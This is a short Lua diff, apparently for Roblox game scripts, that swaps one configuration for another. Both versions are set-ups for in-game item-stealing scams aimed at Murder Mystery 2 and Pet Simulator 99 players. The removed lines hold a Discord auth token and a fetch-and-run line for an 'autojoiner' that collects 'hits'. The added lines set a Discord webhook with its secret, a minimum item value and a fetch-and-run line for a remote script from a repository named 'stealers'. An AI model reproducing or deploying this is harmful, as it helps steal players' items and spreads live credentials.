@@ -1,5 +1,4 @@
-token = "MTI2OTg0MjE0ODI2NjYxMDY5MQ.G-CY8x.ZngH2C3ZH9NPXkEG4VY4aHDKEHMEeg9cVaMd2s" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
-channelId = "1320138871232532520" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
-delay = 2 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/MM2/refs/heads/main/autojoiner.lua'))()
+Username = "Mm2Stocks_Roblox"
+Webhook = "https://discord.com/api/webhooks/1320138901620396063/BYvM66pNA4f3-YWsiCc7Tua48QjhaqhOWlj7FuCtRloyacRsFryJrkRHwe65Gyw3GvE1"
+min_rap = 2 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/all_in_one"))()
